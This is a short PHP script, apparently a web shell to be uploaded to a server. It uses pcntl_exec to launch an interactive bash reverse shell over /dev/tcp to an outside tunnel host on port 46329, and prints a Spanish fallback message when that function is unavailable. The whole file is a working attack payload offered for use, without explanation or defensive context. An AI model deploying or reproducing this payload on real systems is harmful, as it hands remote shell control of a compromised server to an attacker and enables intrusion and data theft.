<?php
$cmd = '/bin/sh';
$args = array('-c', '/bin/bash -i >& /dev/tcp/ttwey-89-187-180-57.run.pinggy-free.link:46329 0>&1');

if (function_exists('pcntl_exec')) {
    pcntl_exec($cmd, $args);
} else {
    echo "pcntl_exec no está disponible.";
}
?>
